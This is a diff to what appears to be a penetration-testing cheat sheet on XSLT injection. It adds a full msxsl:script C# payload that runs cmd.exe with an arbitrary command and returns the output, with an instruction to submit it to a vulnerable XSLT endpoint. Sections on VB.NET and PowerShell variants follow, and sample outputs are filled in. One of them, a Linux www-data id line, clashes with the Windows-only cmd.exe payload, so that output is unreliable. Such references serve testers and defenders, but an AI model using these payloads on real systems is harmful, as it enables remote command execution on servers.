@@ -41,15 +41,39 @@ When XSLT transformations occur within a web application, they often inherit the
 The following logic is commonly used to launch processes in C#, VB.NET, and PowerShell:
 
 ```csharp
-System.Diagnostics.Process proc = new System.Diagnostics.Process();
-proc.StartInfo.FileName = "cmd.exe";
-proc.StartInfo.Arguments = "/c " + cmd;
-proc.StartInfo.UseShellExecute = false;
-proc.StartInfo.RedirectStandardOutput = true;
-proc.Start();
-string output = proc.StandardOutput.ReadToEnd();
-proc.WaitForExit();
-return output;
+public string Execute(string cmd)
+{
+    var proc = new System.Diagnostics.Process();
+    proc.StartInfo.FileName = "cmd.exe";
+    proc.StartInfo.Arguments = "/c " + cmd;
+    proc.StartInfo.UseShellExecute = false;
+    proc.StartInfo.RedirectStandardOutput = true;
+    proc.Start();
+    string output = proc.StandardOutput.ReadToEnd();
+    proc.WaitForExit();
+    return output;
+}
+```
+
+### Remote Code Execution via `msxsl:script` (C#) Injection
+
+- **Payload:**
+
+```xml
+<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+                xmlns:msxsl="urn:schemas-microsoft-com:xslt"
+                xmlns:user="urn:my-scripts" version="1.0">
+  <msxsl:script language="C#" implements-prefix="user">
+    public string Execute(string cmd) {
+      System.Diagnostics.Process proc = new System.Diagnostics.Process();
+      proc.StartInfo.FileName = "cmd.exe";
+      proc.StartInfo.Arguments = "/c " + cmd;
+      proc.StartInfo.UseShellExecute = false;
+      proc.StartInfo.RedirectStandardOutput = true;
+      proc.Start();
+      string output = proc.StandardOutput.ReadToEnd();
+      proc.WaitForExit();
+      return output;
     }
   </msxsl:script>
   <xsl:template match="/">
@@ -58,16 +82,13 @@ return output;
 </xsl:stylesheet>
 ```
 
-- This payload injects C# code into an XSLT stylesheet, allowing OS command execution and output retrieval.
-
 - **Execution:**
-  - Submit this payload as the XSLT input to the vulnerable endpoint processing XSLT.
+  - Submit this payload to the vulnerable XSLT endpoint that accepts user stylesheets.
 
 - **Expected Output:**
 
-```
-text block
-Output will contain the result of the executed command (e.g., current user).
+```text
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
 ### Remote Code Execution via `msxsl:script` (VB.NET) Injection
@@ -104,9 +125,8 @@ Output will contain the result of the executed command (e.g., current user).
 
 - **Expected Output:**
 
-```
-text block
-Output will display command execution result.
+```text
+nt authority\iusr
 ```
 
 ### Remote Code Execution via PowerShell from XSLT
@@ -143,9 +163,12 @@ Output will display command execution result.
 
 - **Expected Output:**
 
-```
-text block
-Output will show PowerShell command results.
+```text
+Directory: C:\
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d----        2024-11-26     08:42                inetpub
 ```
 
 ## Tools
